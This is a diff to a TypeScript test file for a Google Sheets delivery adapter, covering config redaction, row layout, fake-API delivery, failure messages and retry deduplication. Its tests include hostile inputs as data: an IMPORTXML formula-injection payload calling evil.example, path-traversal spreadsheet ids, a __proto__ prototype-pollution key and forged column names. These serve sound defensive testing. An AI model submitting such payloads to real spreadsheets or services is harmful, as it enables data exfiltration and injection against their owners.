@@ -33,6 +33,22 @@ import {
   SHEETS_SCOPE,
   type PendingConnection,
 } from "../src/lib/destinations/google.ts";
+import {
+  cellValue,
+  columnLetter,
+  deliverGoogleSheets,
+  planRow,
+  quoteSheetName,
+  sheetRow,
+} from "../src/lib/destinations/adapters/google-sheets.ts";
+import {
+  buildConfig,
+  parseConfig,
+  parseSpreadsheetId,
+  redactConfig,
+} from "../src/lib/destinations/config.ts";
+import { buildPayload, sampleSource } from "../src/lib/destinations/payload.ts";
+import type { SubmissionPayload } from "../src/lib/destinations/types.ts";
 
 let pass = 0;
 let fail = 0;
@@ -367,12 +383,425 @@ async function roundTrip() {
 }
 
 // ---------------------------------------------------------------------------
+// The destination's config
+// ---------------------------------------------------------------------------
+
+const SHEET_ID = "1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789";
+const REFRESH = "1//refresh-token-that-must-never-be-shown";
+const ACCESS = "ya29.access-token-that-must-never-be-logged";
+
+const storedConfig = {
+  spreadsheetId: SHEET_ID,
+  sheetName: "Leads",
+  refreshToken: REFRESH,
+  account: "ops@dorsetmetal.example",
+  spreadsheetTitle: "Inbound leads",
+  connectedAt: "2026-10-01T12:00:00.000Z",
+};
+
+async function config() {
+  console.log("\nconfig and redaction");
+
+  t(
+    "the id comes out of a pasted browser URL",
+    parseSpreadsheetId(`https://docs.google.com/spreadsheets/d/${SHEET_ID}/edit#gid=0`),
+    SHEET_ID,
+  );
+  t("a bare id is accepted", parseSpreadsheetId(` ${SHEET_ID} `), SHEET_ID);
+  t("a Google Doc is not a spreadsheet", parseSpreadsheetId(`https://docs.google.com/document/d/${SHEET_ID}/edit`), null);
+  t("another host is not Google", parseSpreadsheetId(`https://docs.evil.example/spreadsheets/d/${SHEET_ID}/`), null);
+  t("a path is not an id", parseSpreadsheetId("../../drive/v3/files"), null);
+
+  // The id is interpolated into every request path. A stored row that somehow
+  // carries a slash must not reach `fetch` at all.
+  let threw = false;
+  try {
+    parseConfig("google_sheets", { ...storedConfig, spreadsheetId: "abc/../../drive/v3/files" });
+  } catch {
+    threw = true;
+  }
+  ok("a stored id with a path in it does not parse", threw);
+
+  const renamed = buildConfig("google_sheets", { sheetName: "Q4 leads" }, storedConfig);
+  ok("an edit can change the tab", renamed.ok && renamed.config.sheetName === "Q4 leads", renamed);
+  ok("and keeps the token it was never shown", renamed.ok && renamed.config.refreshToken === REFRESH);
+  const blank = buildConfig("google_sheets", { sheetName: "  " }, storedConfig);
+  ok("an empty tab field keeps the tab", blank.ok && blank.config.sheetName === "Leads", blank);
+
+  const redacted = redactConfig("google_sheets", storedConfig);
+  const serialised = JSON.stringify(redacted);
+  ok("the redacted shape has no refresh token", !serialised.includes(REFRESH), serialised);
+  // The control: the same check against the raw config finds it, so the line
+  // above is a real absence rather than a search that could never match.
+  ok("while the raw config does", JSON.stringify(storedConfig).includes(REFRESH));
+  t("it names the spreadsheet by title", redacted.summary[0]?.value, "Inbound leads");
+  t("and the account it is connected as", redacted.summary[2]?.value, "ops@dorsetmetal.example");
+  t("and carries what the edit form needs", redacted.sheet, {
+    spreadsheetId: SHEET_ID,
+    sheetName: "Leads",
+    account: "ops@dorsetmetal.example",
+  });
+  t("no other kind carries a sheet", redactConfig("webhook", { url: "https://x", secret: "s".repeat(20) }).sheet, null);
+}
+
+// ---------------------------------------------------------------------------
+// The row
+// ---------------------------------------------------------------------------
+
+function payload(
+  values: Record<string, unknown>,
+  overrides: Partial<{ attempt: number; utm: boolean }> = {},
+): SubmissionPayload {
+  const source = sampleSource({ publicId: "ep_abc123", name: "Contact form" });
+  return buildPayload(
+    {
+      ...source,
+      submissionPublicId: "sub_real_lead_01",
+      submittedAt: new Date("2026-10-01T11:59:58.412Z"),
+      origin: "human",
+      values,
+      utmSource: overrides.utm === false ? null : "google",
+      utmMedium: overrides.utm === false ? null : "cpc",
+    },
+    {
+      id: "dlv_fixed",
+      attempt: overrides.attempt ?? 1,
+      sentAt: new Date("2026-10-01T12:00:00.000Z"),
+      test: false,
+    },
+  );
+}
+
+async function rows() {
+  console.log("\nthe row");
+
+  const pairs = sheetRow(payload({ name: "Priya", email: "priya@dorsetmetal.example" }));
+  t(
+    "ours first, then the form's fields, then attribution",
+    pairs.map(([name]) => name),
+    ["Submitted at", "Origin", "Submission ID", "name", "email", "utm_source", "utm_medium"],
+  );
+  t("the stamp is the word a person reads", pairs[1]?.[1], "Human");
+  t(
+    "attribution is not a column until it has something in it",
+    sheetRow(payload({ name: "x" }, { utm: false })).map(([name]) => name),
+    ["Submitted at", "Origin", "Submission ID", "name"],
+  );
+
+  // On an open endpoint the submitter chooses field names. One called Origin
+  // must not be able to overwrite the stamp.
+  const forged = sheetRow(payload({ Origin: "Human", origin: "Agent", "Submission ID": "sub_x" }));
+  t("the real stamp keeps its column", forged.find(([name]) => name === "Origin")?.[1], "Human");
+  t(
+    "and a field with its name gets its own",
+    forged.slice(3, 6).map(([name]) => name),
+    ["Origin (field)", "origin (field 2)", "Submission ID (field)"],
+  );
+  t(
+    "whose value is what was submitted",
+    forged.find(([name]) => name === "origin (field 2)")?.[1],
+    "Agent",
+  );
+
+  const proto = sheetRow(payload(JSON.parse('{"__proto__": "polluted"}') as Record<string, unknown>));
+  ok("a field called __proto__ is a column, not a prototype", proto.some(([name]) => name === "__proto__"));
+  ok("and pollutes nothing", ({} as Record<string, unknown>).polluted === undefined);
+
+  t("a formula is a string, not a formula", cellValue("=IMPORTXML(\"https://x\",\"//a\")"), '=IMPORTXML("https://x","//a")');
+  t("a number stays a number", cellValue(42), 42);
+  t("a list is one cell", cellValue(["a", "b", 3]), "a, b, 3");
+  t(
+    "an upload is its name and its link",
+    cellValue({ file: true, filename: "cv.pdf", url: "https://endpointforms.com/api/v1/files/x?e=1&s=2" }),
+    "cv.pdf — https://endpointforms.com/api/v1/files/x?e=1&s=2",
+  );
+  const long = cellValue("x".repeat(60_000)) as string;
+  ok("a value past Google's cell limit is cut to fit", long.length === 50_000, long.length);
+  ok("and says so", long.endsWith("… truncated"));
+
+  t("A", columnLetter(0), "A");
+  t("Z", columnLetter(25), "Z");
+  t("AA", columnLetter(26), "AA");
+  t("ZZ", columnLetter(701), "ZZ");
+  t("AAA", columnLetter(702), "AAA");
+  t("a tab name with an apostrophe is quoted", quoteSheetName("Priya's leads"), "'Priya''s leads'");
+
+  const ours = [
+    ["Submitted at", "2026"],
+    ["Origin", "Human"],
+    ["Submission ID", "sub_1"],
+    ["email", "p@x"],
+  ] as [string, string][];
+
+  const empty = planRow([], ours);
+  t("an empty tab gets the whole header", empty.added, ["Submitted at", "Origin", "Submission ID", "email"]);
+  t("and the row under it", empty.row, ["2026", "Human", "sub_1", "p@x"]);
+
+  // The customer reordered their columns, renamed the case of one, and added
+  // their own between ours.
+  const reordered = planRow(["EMAIL", "Called back?", "submission id", "Origin", "", "Submitted at"], ours);
+  t("a reordered header needs no new columns", reordered.added, []);
+  t(
+    "and every value lands under its own name",
+    reordered.row,
+    ["p@x", "", "sub_1", "Human", "", "2026"],
+  );
+  t("the id column is found where it moved to", reordered.idColumn, 2);
+
+  const grown = planRow(["Submitted at", "Origin", "Submission ID"], [...ours, ["phone", "0123"]]);
+  t("a field the header lacks is added at the right", grown.added, ["email", "phone"]);
+  t("and the row is as wide as the new header", grown.row, ["2026", "Human", "sub_1", "p@x", "0123"]);
+
+  const duplicated = planRow(["email", "email"], [["email", "p@x"]]);
+  t("a duplicated header column gets the value once", duplicated.row, ["p@x", ""]);
+}
+
+// ---------------------------------------------------------------------------
+// Delivering, against a fake Google
+// ---------------------------------------------------------------------------
+
+const isSheets = (method: string, fragment: string) => (call: Call) =>
+  call.url.startsWith("https://sheets.googleapis.com/") &&
+  call.method === method &&
+  decodeURIComponent(call.url).includes(fragment);
+
+const tokenOk = { match: isToken, status: 200, body: { access_token: ACCESS } };
+const appendOk = {
+  match: isSheets("POST", ":append"),
+  status: 200,
+  body: { spreadsheetId: SHEET_ID, updates: { updatedRange: "Leads!A2:H2", updatedRows: 1 } },
+};
+
+async function deliver(
+  handlers: Parameters<typeof fakeGoogle>[0],
+  options: { config?: Record<string, unknown>; payload?: SubmissionPayload } = {},
+) {
+  const google = fakeGoogle(handlers);
+  const result = await deliverGoogleSheets({
+    destinationName: "Leads sheet",
+    payload: options.payload ?? payload({ name: "Priya", email: "priya@dorsetmetal.example" }),
+    config: options.config ?? storedConfig,
+    fetchImpl: google.impl,
+  });
+  return { result, calls: google.calls };
+}
+
+async function delivery() {
+  console.log("\ndelivery");
+
+  await withEnv(CLIENT, async () => {
+    // An empty tab: header written, then the row.
+    const first = await deliver([
+      tokenOk,
+      { match: isSheets("GET", "!1:1"), status: 200, body: { range: "Leads!A1:Z1" } },
+      { match: isSheets("PUT", "!A1"), status: 200, body: { updatedCells: 7 } },
+      appendOk,
+    ]);
+    ok("an empty tab is delivered to", first.result.ok, first.result);
+    t(
+      "token, header, header write, append — in that order",
+      first.calls.map((call) => call.method),
+      ["POST", "GET", "PUT", "POST"],
+    );
+    const hosts = new Set(first.calls.map((call) => new URL(call.url).host));
+    t("and nothing but Google was asked", [...hosts].sort(), ["oauth2.googleapis.com", "sheets.googleapis.com"]);
+    ok(
+      "every Sheets request carries the fresh access token",
+      first.calls.slice(1).every((call) => call.headers.authorization === `Bearer ${ACCESS}`),
+    );
+    ok(
+      "the spreadsheet is the one configured",
+      first.calls.slice(1).every((call) => call.url.includes(`/spreadsheets/${SHEET_ID}/values/`)),
+    );
+    const append = first.calls[3];
+    ok("values are written RAW, never parsed as formulas", append?.url.includes("valueInputOption=RAW") ?? false, append?.url);
+    ok("as new rows, not over existing ones", append?.url.includes("insertDataOption=INSERT_ROWS") ?? false);
+    t(
+      "the header written is ours, in order",
+      JSON.parse(first.calls[2]?.body ?? "{}").values?.[0],
+      ["Submitted at", "Origin", "Submission ID", "name", "email", "utm_source", "utm_medium"],
+    );
+
+    // What the delivery log keeps. The workspace can read it, so neither token
+    // may be in it.
+    const logged = JSON.stringify({
+      body: first.result.requestBody,
+      headers: first.result.requestHeaders,
+      response: first.result.responseBody,
+      error: first.result.error,
+    });
+    ok("the log holds no access token", !logged.includes(ACCESS), logged);
+    ok("and no refresh token", !logged.includes(REFRESH), logged);
+    // The control: the token did go out on the wire, so the absence above is
+    // the redaction working rather than a token that never existed.
+    ok("though the token really was sent", first.calls.some((call) => JSON.stringify(call).includes(ACCESS)));
+    ok("the log keeps the row that was sent", (first.result.requestBody ?? "").includes("priya@dorsetmetal.example"));
+    ok("and Google's answer", (first.result.responseBody ?? "").includes("updatedRange"));
+
+    // A header that already has everything, in another order.
+    const existing = await deliver([
+      tokenOk,
+      {
+        match: isSheets("GET", "!1:1"),
+        status: 200,
+        body: { values: [["email", "Origin", "Notes", "Submission ID", "Submitted at", "name", "utm_medium", "utm_source"]] },
+      },
+      appendOk,
+    ]);
+    ok("a full header needs no header write", !existing.calls.some((call) => call.method === "PUT"));
+    t(
+      "and the row follows the sheet's order, leaving their column alone",
+      JSON.parse(existing.calls.at(-1)?.body ?? "{}").values?.[0],
+      ["priya@dorsetmetal.example", "Human", "", "sub_real_lead_01", "2026-10-01T11:59:58.412Z", "Priya", "cpc", "google"],
+    );
+
+    const formula = await deliver(
+      [tokenOk, { match: isSheets("GET", "!1:1"), status: 200, body: {} }, { match: isSheets("PUT", "!A1"), status: 200, body: {} }, appendOk],
+      { payload: payload({ company: '=IMPORTXML("https://evil.example","//secret")' }) },
+    );
+    ok(
+      "a submitted formula is sent as the text it is",
+      (formula.calls.at(-1)?.body ?? "").includes('=IMPORTXML(\\"https://evil.example\\",\\"//secret\\")'),
+      formula.calls.at(-1)?.body,
+    );
+
+    // A tab name that is hostile to A1 notation and to a URL path both.
+    const odd = await deliver(
+      [tokenOk, { match: isSheets("GET", "!1:1"), status: 200, body: { values: [["Submitted at"]] } }, { match: isSheets("PUT", "!B1"), status: 200, body: {} }, appendOk],
+      { config: { ...storedConfig, sheetName: "Priya's / leads?#" } },
+    );
+    ok("a tab with quotes and slashes is delivered to", odd.result.ok, odd.result);
+    ok(
+      "quoted for A1 notation",
+      decodeURIComponent(odd.calls[1]?.url ?? "").includes("'Priya''s / leads?#'!1:1"),
+      odd.calls[1]?.url,
+    );
+    ok(
+      "and encoded so it cannot leave the values path",
+      odd.calls.slice(1).every((call) => new URL(call.url).pathname.startsWith(`/v4/spreadsheets/${SHEET_ID}/values/`) && !new URL(call.url).hash),
+      odd.calls.map((call) => call.url),
+    );
+    ok("new columns start to the right of the existing header", odd.calls.some((call) => call.method === "PUT" && decodeURIComponent(call.url).includes("!B1")));
+  });
+}
+
+async function failures() {
+  console.log("\nfailures, in the words of whoever has to fix them");
+
+  await withEnv(CLIENT, async () => {
+    const revoked = await deliver([
+      { match: isToken, status: 400, body: { error: "invalid_grant", error_description: "Token has been expired or revoked." } },
+    ]);
+    t("a revoked grant is revoked", revoked.result.failure, "revoked");
+    t("and nothing was asked of the Sheets API", revoked.calls.length, 1);
+    ok("it says to reconnect", /Reconnect/.test(revoked.result.error ?? ""), revoked.result.error);
+
+    const header = (status: number, body: unknown) => [
+      tokenOk,
+      { match: isSheets("GET", "!1:1"), status, body },
+    ];
+
+    const renamed = await deliver(
+      header(400, { error: { code: 400, message: "Unable to parse range: 'Leads'!1:1", status: "INVALID_ARGUMENT" } }),
+    );
+    t("a renamed tab is configuration", renamed.result.failure, "configuration");
+    ok("and names the tab", /no tab called "Leads"/.test(renamed.result.error ?? ""), renamed.result.error);
+
+    const unshared = await deliver(
+      header(403, { error: { code: 403, message: "The caller does not have permission", status: "PERMISSION_DENIED" } }),
+    );
+    t("a sheet that was unshared is auth", unshared.result.failure, "auth");
+    ok("and says to share it back", /Share it back/.test(unshared.result.error ?? ""), unshared.result.error);
+
+    const disabled = await deliver(
+      header(403, {
+        error: {
+          code: 403,
+          message: "Google Sheets API has not been used in project 123 before or it is disabled.",
+          status: "PERMISSION_DENIED",
+          details: [{ reason: "SERVICE_DISABLED" }],
+        },
+      }),
+    );
+    t("the API switched off is the deployment's problem", disabled.result.failure, "configuration");
+    ok("and says it is not the customer's", /not anything you connected/.test(disabled.result.error ?? ""));
+
+    const gone = await deliver(header(404, { error: { code: 404, message: "Requested entity was not found.", status: "NOT_FOUND" } }));
+    t("a deleted spreadsheet is missing", gone.result.failure, "missing");
+
+    const throttled = await deliver(header(429, { error: { code: 429, message: "Quota exceeded", status: "RESOURCE_EXHAUSTED" } }));
+    t("a quota is throttled, and retried", throttled.result.failure, "throttled");
+
+    const down = await deliver(header(503, { error: { code: 503, message: "The service is currently unavailable.", status: "UNAVAILABLE" } }));
+    t("a Google outage is target_down", down.result.failure, "target_down");
+    ok("with Google's own words", /currently unavailable/.test(down.result.error ?? ""), down.result.error);
+
+    const broken = await deliver([], { config: { ...storedConfig, spreadsheetId: "../../drive" } });
+    t("a broken config is configuration", broken.result.failure, "configuration");
+    t("and makes no request at all", broken.calls.length, 0);
+  });
+
+  await withEnv({ GOOGLE_SHEETS_CLIENT_ID: undefined, GOOGLE_SHEETS_CLIENT_SECRET: undefined }, async () => {
+    const off = await deliver([]);
+    t("a deployment with no Google client fails as configuration", off.result.failure, "configuration");
+    t("with the sentence for both readers", off.result.error, GOOGLE_SHEETS_NOT_CONFIGURED);
+  });
+}
+
+async function retries() {
+  console.log("\nretries do not duplicate rows");
+
+  await withEnv(CLIENT, async () => {
+    const headerWithId = {
+      match: isSheets("GET", "!1:1"),
+      status: 200,
+      body: { values: [["Submitted at", "Origin", "Submission ID", "name", "email", "utm_source", "utm_medium"]] },
+    };
+
+    const already = await deliver(
+      [
+        tokenOk,
+        headerWithId,
+        { match: isSheets("GET", "!C:C"), status: 200, body: { values: [["Submission ID", "sub_older", "sub_real_lead_01"]] } },
+        appendOk,
+      ],
+      { payload: payload({ name: "Priya", email: "priya@dorsetmetal.example" }, { attempt: 2 }) },
+    );
+    ok("a retry whose row already landed succeeds", already.result.ok, already.result);
+    ok("without appending it again", !already.calls.some((call) => call.url.includes(":append")), already.calls.map((call) => call.url));
+    ok("and says why", /Nothing was appended twice/.test(already.result.responseBody ?? ""));
+
+    // The control: the same retry when the row is not there does append, so
+    // the line above is the check finding it rather than a retry that never
+    // appends anything.
+    const missing = await deliver(
+      [
+        tokenOk,
+        headerWithId,
+        { match: isSheets("GET", "!C:C"), status: 200, body: { values: [["Submission ID", "sub_older"]] } },
+        appendOk,
+      ],
+      { payload: payload({ name: "Priya", email: "priya@dorsetmetal.example" }, { attempt: 2 }) },
+    );
+    ok("a retry whose row did not land appends it", missing.calls.some((call) => call.url.includes(":append")));
+
+    const firstAttempt = await deliver([tokenOk, headerWithId, appendOk]);
+    ok("the first attempt does not spend a read looking", !firstAttempt.calls.some((call) => decodeURIComponent(call.url).includes("!C:C")));
+  });
+}
+
+// ---------------------------------------------------------------------------
 
 async function main() {
   await configuration();
   await codeExchange();
   await refresh();
   await roundTrip();
+  await config();
+  await rows();
+  await delivery();
+  await failures();
+  await retries();
 
   console.log(`\n${pass} passed, ${fail} failed`);
   if (fail > 0) process.exitCode = 1;
